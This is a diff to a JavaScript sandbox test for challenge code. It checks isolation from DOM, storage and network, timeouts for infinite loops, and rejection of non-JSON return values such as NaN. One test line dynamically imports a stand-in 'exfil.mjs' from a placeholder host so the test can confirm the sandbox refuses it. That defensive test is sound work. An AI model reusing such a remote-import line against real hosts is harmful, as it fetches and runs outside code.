@@ -166,10 +166,14 @@ function serve() {
       const result = await runChallenge(source('export function resolver(){return {dom:typeof document,storage:typeof indexedDB,network:typeof fetch}}'), c);
       const infinite = await runChallenge(source('export function resolver(){while(true){}}'), c, { caseTimeoutMs: 150 });
       const remote = await runChallenge(source('export async function resolver(){await import("https://example.invalid/exfil.mjs");return 1}'), c);
-      return { result, infinite, remote, frames: document.querySelectorAll('iframe[sandbox]').length };
+      const invalidValues = [];
+      for (const expression of ['NaN', 'Infinity', '{nested:NaN}', '[undefined]', '{toJSON(){return null}}'])
+        invalidValues.push((await runChallenge(source('export function resolver(){return ' + expression + '}'), c))[0]);
+      return { result, infinite, remote, invalidValues, frames: document.querySelectorAll('iframe[sandbox]').length };
     });
     assert.deepEqual(sandbox.result[0].value, { dom: 'undefined', storage: 'undefined', network: 'undefined' });
     assert.equal(sandbox.infinite[0].error, 'TIMEOUT'); assert.equal(sandbox.remote[0].ok, false); assert.equal(sandbox.frames, 0);
+    assert.ok(sandbox.invalidValues.every(v => v.ok === false && v.error === 'EXECUTION_ERROR'));
     record('Sandbox sem DOM/rede/armazenamento, import externo recusado e laço encerrado');
     for (const failedMode of ['timeout', 'wrong-nonce']) {
       mode = failedMode;
